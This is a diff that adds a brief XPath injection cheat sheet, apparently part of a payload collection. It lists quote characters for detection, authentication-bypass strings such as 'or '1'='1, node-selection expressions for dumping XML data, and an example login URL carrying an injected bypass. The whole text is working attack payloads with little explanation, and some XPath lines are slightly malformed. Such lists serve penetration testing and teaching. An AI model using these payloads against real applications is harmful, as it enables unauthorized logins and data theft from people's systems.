@@ -1,1 +1,27 @@
-XPath Injection
+## Detection ##
+
+' (Single Quote)
+" (Double Quote)
+
+
+## Exploitation ##
+
+'or '1'='1
+'or 1=1 or '='
+
+]|*|user[@role='admin
+
+"NODENAME"  (Return all children of node)
+ 
+"//NODENAME" (Return all elements in the document)
+
+"NODeNAME//SUBNODENAME"  (return all SUBNODE under NODE element)
+
+"//NODENAME/[NAME="VALUE"     (value = admin)
+
+
+## Example ##
+
+http://site.com/login.php?username=admin' or 1=1 or ''='
+
+
